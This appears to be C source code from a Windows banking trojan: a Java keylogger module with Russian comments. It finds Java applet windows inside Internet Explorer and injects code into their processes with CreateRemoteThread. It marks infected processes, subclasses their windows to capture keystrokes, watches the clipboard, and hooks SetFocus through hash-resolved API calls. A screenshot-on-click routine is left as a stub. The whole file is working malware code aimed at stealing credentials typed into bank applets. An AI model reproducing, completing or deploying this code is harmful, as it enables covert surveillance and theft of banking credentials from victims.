#include <windows.h>

#include "Getapi.h"
#include "Crypt.h"
#include "Utils.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "ntdll.h"
#include "JavaKeyLog.h"
#include "inject.h"
#include "Splice.h"

#include "BotDebug.h"

HWND hNextViewer;
bool bKLogActive=false;

// оконная процедура "фейкового" окна. нужна для отлова сообщения об изменениях в клипборде
LRESULT WINAPI CBSpyWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
	{
        hNextViewer=(HWND)pSetClipboardViewer(hWnd);
        break;
    }
    case WM_DRAWCLIPBOARD:
    {
        // пока не активен кейлоггер клипборд нам в хуй не впился
        if (bKLogActive)
		{
			// текст?
            if (pIsClipboardFormatAvailable(CF_TEXT))
            {
                // клипборд не занят?
                if (pOpenClipboard(hWnd))
                {
                    // тогда получаем текст..
                    HANDLE hData=pGetClipboardData(CF_TEXT);
                    char *lpData=(char*)pGlobalLock(hData);
                    //dprintf("cb: %s",lpData);
                    pGlobalUnlock(hData);
                    pCloseClipboard();
                }
            }
        }
		// передаем далее по цепочке
        pPostMessageA(hNextViewer,uMsg,wParam,lParam);
        break;
    }
    case WM_CHANGECBCHAIN:
    {
        if (hNextViewer == (HWND)wParam)
            hNextViewer=(HWND)lParam;
        else
			pPostMessageA(hNextViewer, uMsg, wParam, lParam);
        break;
    }
    case WM_DESTROY:
	{
        pChangeClipboardChain(hWnd,hNextViewer);
        break;
    }
    }
    return (LRESULT)pDefWindowProcA(hWnd,uMsg,wParam,lParam);
}

char szUrl[512];
WNDS Wnds[500];
int dwWndsCount=0;

// функа ищет по HWND прошлую кэл-бэк процеруду. в окно жабы зашить не получилось - сучка падала..
// хотя можно с SetWindowProp в принципе переделать, должно работать (только что придумал:)
WNDPROC GetWndProc(HWND hWnd)
{
    for (int i=0; i<=dwWndsCount; i++)
    {
        if (Wnds[i].hWnd == hWnd)
            return Wnds[i].lpWndProc;
    }
    return NULL;
}

// основная процедура логирования кибордных сообщений
LRESULT WINAPI KLogWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
        // нажали? то, что нам надо!
        case WM_KEYDOWN:
        {
            // получаем символ
            WCHAR szBuff[200],buff[1024];
            int dwLen=(int)pGetKeyNameTextW(lParam,szBuff,sizeof(szBuff));
            if (dwLen > 1)
            {
                // если это не символ а какая-то клавиша (ctrl, alt.. да любая другая VK_* хуйня) - выводим в отдадочный вывод [KEY]
                //pwsprintfW(buff,L"[%s]", szBuff);
                pOutputDebugStringW(buff);
            }
            else
            {
                // получаем символ
                byte KeybrdState[256];
                pGetKeyboardState(KeybrdState);
                WCHAR Char[4];
                pToUnicodeEx(wParam,0,KeybrdState,Char,sizeof(Char)/sizeof(Char[0]),0,pGetKeyboardLayout(pGetCurrentThreadId()));
                Char[1]=0;

                // и выводим в отладочный вывод СИМВОЛ
				//pwsprintfW(buff,L"%s", Char);
                pOutputDebugStringW(buff);
            }
            break;
        }
        // если мыщей тыкнули - снимаем скрин
        case WM_LBUTTONDOWN:
        {
            WORD dwX=(WORD)lParam,
				 dwY=lParam >> 16;
            /* TODO :
--------------------------------------------------------------------------------------------
Добавить процедуру скриншота
--------------------------------------------------------------------------------------------- */

//            MakeScreenShot(hWnd,dwX,dwY,szUrl);
            break;
        }
    }
    return (LRESULT)pCallWindowProcA(GetWndProc(hWnd),hWnd,uMsg,wParam,lParam);
}

DWORD dwPID;

// непосредственно функа для сабклассинга
void SubclassWindow(HWND hWnd)
{
    if ((LONG)pGetWindowLongA(hWnd,GWL_WNDPROC) != (LONG)KLogWndProc)
    {
        Wnds[dwWndsCount].hWnd=hWnd;
        Wnds[dwWndsCount++].lpWndProc=(WNDPROC)pSetWindowLongA(hWnd,GWL_WNDPROC,(LONG)KLogWndProc);
    }
    return;
}

// ищем НАШИ чайлды и сабклассим их тоже
bool CALLBACK EnumChildWndsProc(HWND hWnd,LPARAM lParam)
{
	DWORD dwProcID;
	pGetWindowThreadProcessId(hWnd,&dwProcID);
    if (dwProcID == dwPID)
        SubclassWindow(hWnd);
	return true;
}

// ищем НАШИ окна и сабклассим их
bool CALLBACK EnumWndsProc(HWND hWnd,LPARAM lParam)
{
	DWORD dwProcID;
	pGetWindowThreadProcessId(hWnd,&dwProcID);
	if (dwProcID == dwPID)
		SubclassWindow(hWnd);
	pEnumChildWindows(hWnd,(WNDENUMPROC)EnumChildWndsProc,NULL);
	return true;
}

// функа листает окна и сабклассит их.. понятно
void SubclassAllMyWnds()
{
	pEnumWindows((WNDENUMPROC)EnumWndsProc,NULL);
    return;
}

HWND hBrowserWnd=0;
int WINAPI WndsSpy(LPVOID tmp)
{
    if (!tmp)
	{
        while(true)
        {
            if (hBrowserWnd)
				bKLogActive = EnumWnds(hBrowserWnd);
			pSleep(100);
		}
	}
    else
	{
		dwPID = (DWORD)pGetCurrentProcessId();
        while(true)
		{
			SubclassAllMyWnds();
			pSleep(100);
        }
	}

    return 0;
}

// поток, внедренный в чужой процесс
DWORD WINAPI JavaThread(void *lpTmp)
{
	// если не первый запуск - шло все нахуй
	if ((int) lpTmp != 0xDEAD)
		return 0;

	byte *hMod=(byte *)pGetModuleHandleW(0);

	WORD tmp='ZM'^0x3030;
	tmp^=0x3030;

	if (*(WORD*)hMod == tmp)
    {
        tmp='EP'^0x3030;
        tmp^=0x3030;

        PIMAGE_NT_HEADERS pnth=(PIMAGE_NT_HEADERS)&hMod[((PIMAGE_DOS_HEADER)hMod)->e_lfanew];

        //ставим флаг "зараженности"
        if (*(WORD*)pnth == tmp)
        {
            DWORD dwOldProt;
            pVirtualProtect(&pnth->FileHeader.TimeDateStamp,4,PAGE_READWRITE,&dwOldProt);
            pnth->FileHeader.TimeDateStamp=0x6D7A726D;
            pVirtualProtect(&pnth->FileHeader.TimeDateStamp,4,dwOldProt,&dwOldProt);
        }
    }

    m_memset(Wnds,0,sizeof(Wnds));
    dwWndsCount=0;
    WCHAR szJavaEvent[]= {'J','a','v','a','E','v','e','n','t',0};
    HANDLE hEvent=pOpenEventW(EVENT_ALL_ACCESS,false,szJavaEvent);
    // все заебись, дальше можно не ждать
    pSetEvent(hEvent);
    pCloseHandle(hEvent);
    // создаем поток, сабклассящий все окна жабы
    StartThread(WndsSpy,(LPVOID)1);

    return 0;
}

// поток, отвечающий за управление "фейковым" окном, следящим за клипбордом
DWORD WINAPI CBSpyThread(LPVOID tmp)
{
    char szClassName[]= {'C','B','S','p','y',0};

    WNDCLASS wcWnd;
    wcWnd.style = 0;
	wcWnd.cbClsExtra = 0;
	wcWnd.cbWndExtra = 0;
	wcWnd.hIcon = 0;
	wcWnd.hbrBackground = (HBRUSH)(COLOR_BTNFACE+1);
	wcWnd.lpszMenuName = 0;
	wcWnd.lpszClassName = szClassName;
	wcWnd.lpfnWndProc = CBSpyWndProc;
	wcWnd.hInstance = (HINSTANCE)pGetModuleHandleW(NULL);
	wcWnd.hCursor = (HCURSOR)pLoadCursorW(NULL,IDC_ARROW);
	pRegisterClassA(&wcWnd);
    // создаем "фейковое" окно
    pCreateWindowExA(WS_EX_APPWINDOW, szClassName, NULL,WS_OVERLAPPEDWINDOW+WS_CLIPCHILDREN,0,0,0,0,NULL,NULL,wcWnd.hInstance,NULL);

    // ждем пока будет запущен браузер. кстати, нужно бы еще IsWindow(hBrowserWnd) прикрутить
    // на случай умерщвления браузера
    while (!hBrowserWnd)
    {
        // ищем окно браузера, ну понятно...
        HWND hWnd=(HWND)pGetWindow(pGetWindow((HWND)pGetDesktopWindow(),GW_CHILD),GW_HWNDLAST);
        do
        {
            char szClass[260], szIE[]= {'i','e','f','r','a','m','e'};
            pGetClassNameA(hWnd,szClass,sizeof(szClass));
            if (!plstrcmpiA(szClass,szIE))
            {
                hBrowserWnd=hWnd;
                break;
            }
            Sleep(1);
		}
        while (hWnd=(HWND)pGetWindow(hWnd, GW_HWNDPREV));
    }

    // если нашли - запускаем поток, блуждающий по древу окон в поисках жабы
	StartThread(WndsSpy, NULL);

	// обычная вполне весчь, обработка оконных сообщений для "фейкового" окна
	MSG Msg;
	while (pGetMessageA(&Msg,NULL,NULL,NULL))
	{
		pTranslateMessage(&Msg);
		pDispatchMessageA(&Msg);
	}
	return 0;
}

// процедура определения зараженности процесса
bool IsProcessInfected(HANDLE hProc)
{
    bool ret_val=false;
    PROCESS_BASIC_INFORMATION pbi;

	// получаем адрес PEB

    if (!pZwQueryInformationProcess(hProc,ProcessBasicInformation,&pbi,sizeof(pbi),NULL))
    {
        PEB peb;
        // читаме содержимое PEB
        if (pReadProcessMemory(hProc,pbi.PebBaseAddress,&peb,sizeof(peb),0))
        {
            byte Buf[500];

            // читаем первые 500 байт от начала страницы
            if (pReadProcessMemory(hProc, peb.ImageBaseAddress, (PCHAR)&Buf, sizeof(Buf),0))
            {
                WORD tmp='ZM' ^ 0x3030;
                tmp^=0x3030;

                if (*(WORD*)&Buf == tmp)
                {
                    tmp='EP'^0x3030;
                    tmp^=0x3030;

                    PIMAGE_NT_HEADERS pnth=(PIMAGE_NT_HEADERS)&Buf[((PIMAGE_DOS_HEADER)&Buf)->e_lfanew];

                    if (*(WORD*)pnth == tmp)
                    {
                        // если поле PIMAGE_NT_HEADERS.FileHeader.TimeDateStamp равно 0x6D7A726D - процесс уже инфицирован
                        if (pnth->FileHeader.TimeDateStamp == 0x6D7A726D)
                            ret_val=true;
                    }
                }
            }
        }
    }
    return ret_val;
}

// процедуру внедрения в процесс, владеющий окном
void InjectToWnd(HWND hWnd)
{
    if (hWnd)
    {
        WCHAR szJavaEvent[]= {'J','a','v','a','E','v','e','n','t',0};
        // создаем событие, идентифицирующее что процесс успешно заражен
        HANDLE hEvent = pCreateEventW(NULL, true, false, szJavaEvent);
        DWORD dwProcID;

        // получаем ID процесса
        pGetWindowThreadProcessId(hWnd,&dwProcID);

        HANDLE hProcess;

        // и открываем процесс
        if ( !(hProcess=pOpenProcess( PROCESS_ALL_ACCESS, false, dwProcID ) ))
        {
            // нет? ну и хуй с ним!
			return;
		}

		// уже заражен? пропускаем
		if (!IsProcessInfected(hProcess))
        {
            // выделяем память в инфицируем процессе
			DWORD dwAddr = InjectCode(hProcess, JavaThread);
            // и передаем управление нашему коду
            pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwAddr, 0xDEAD, 0, 0 );
            // и ждем пока он отработает
            pWaitForSingleObject(hEvent,INFINITE);

            pCloseHandle(hEvent);
		}

        pCloseHandle(hProcess);
    }
    return;
}

// продура поиска нужных нам окон
bool EnumWnds(HWND hWnd)
{
	char szSunAwtFrame[]= {'S','u','n','A','w','t','F','r','a','m','e',0},
			 szAtlShit[]= {'A','T','L',':','1','0','0','9','8','D','8','0',0},
		   szClassName[260];
	bool ret_val = false;
    pGetClassNameA(hWnd, szClassName,sizeof(szClassName)-1);
	HWND hChild=0;

    // жаба?
    if (!plstrcmpiA(szClassName,szSunAwtFrame))
    {
        // ага! внедряемся в процесс.
        InjectToWnd(hWnd);
		hChild = (HWND)pGetWindow(hWnd,GW_HWNDNEXT);
        ret_val=true;
    }
    // какой-то там еще хуй.. какой-то банк использует, уж не вспомню :)
    else if (!plstrcmpiA(szClassName,szAtlShit))
    {
        // ага! внедряемся в процесс.
        pGetWindowThreadProcessId(hWnd,&dwPID);
        pEnumChildWindows(hWnd,(WNDENUMPROC)EnumChildWndsProc,NULL);
        ret_val=true;
    }
    // нет? ну и хуй с ним!
    else
        hChild=(HWND)pGetWindow(hWnd,GW_CHILD);

    while (hChild)
    {
        // продолжаем поиск для потомков окна
        ret_val=EnumWnds(hChild);
        hChild=(HWND)pGetWindow(hChild,GW_HWNDNEXT);
        Sleep(1);
    }
    return ret_val;
}


//----------------------------------------------------------------------------

typedef HWND (WINAPI *PSetFocus)(HWND hWnd);
typedef int (WINAPI *PSendMessage)(HWND Wnd, DWORD MSG, int WParam, int LParam);


PSetFocus Real_SetFocus;
PSendMessage Real_SendMessage;

HWND FocusWnd = 0;


bool IsJavaEdit(HWND Wnd, DWORD Level)
{
	if (Level > 3)
    	return false;

	const static char SunAwtFrame[] = {'S','u','n','A','w','t','F','r','a','m','e',0};
	const static char SunAwtCanvas[] = {'S','u','n','A','w','t','C', 'a', 'n', 'v', 'a', 's', 0};

	// Функция возвращает истину ессли окно принадлежит контролу ява
	const DWORD Max_ClassName = 50;
	char ClassName[Max_ClassName + 1];

	Wnd = (HWND)pGetParent(Wnd);

	pGetClassNameA(Wnd, ClassName, Max_ClassName);

	int Index = StrIndexOf(ClassName, false, 2, (PCHAR)SunAwtFrame, (PCHAR)SunAwtCanvas);
	if (Index >= 0)
		return true;

	if (STR::IsEmpty(ClassName))
		return false;

    return IsJavaEdit(Wnd, Level + 1);
}



//DWORD WINAPI ThreadCheckFocus(LPVOID Data)
//{
//	Sleep(2000);
//	const DWORD Max_ClassName = 255;
//	char ClassName[Max_ClassName + 1];
//
//	while (true)
//	{
//		HWND Temp = GetForegroundWindow();
//		if (Temp != NULL && Temp != FocusWnd)
//		{
//            FocusWnd = Temp;
//			pGetClassNameA(FocusWnd, ClassName, Max_ClassName);
//
//			Debug::MessageEx("JavaKeyLogger", 0, "SetFocus", NULL, ClassName);
//		}
//		Sleep(200);
//    }
//}




void ProcessSetFocus(HWND Wnd)
{
	if (IsJavaEdit(Wnd, 0))
	{

		const DWORD Max_ClassName = 255;
		char ClassName[Max_ClassName + 1];

		pGetClassNameA(Wnd, ClassName, Max_ClassName);

		Debug::MessageEx("JavaKeyLogger", 0, "SetFocus", NULL, ClassName);
	}

}

HWND WINAPI Hook_SetFocus(HWND hWnd)
{
	ProcessSetFocus(hWnd);
	return Real_SetFocus(hWnd);
}


int WINAPI Hook_SendMessage(HWND Wnd, DWORD MSG, int WParam, int LParam)
{

	if (MSG == WM_KILLFOCUS)
    	ProcessSetFocus(Wnd);
    return Real_SendMessage(Wnd, MSG, WParam, LParam);
}



void StartJavaKeyLogger()
{
	// Запускаем мониторинг ява
	DWORD Hash_SetFocus = 0x6D5F6D57;
//	DWORD Hash_SetFocus = 0xDB7C98FC;

	DWORD Hash_SendMessageA = 0x58A81C29;
//	SetFocus(
//    StartThread(ThreadCheckFocus, NULL);

//	if (HookApi(3, Hash_SendMessageA, (DWORD)&Hook_SendMessage))
//	{
//		__asm mov [Real_SendMessage], eax
//	}


	if (HookApi(3, Hash_SetFocus, (DWORD)&Hook_SetFocus))
	{
		__asm mov [Real_SetFocus], eax
	}

	//StartThread(CBSpyThread, NULL);
}
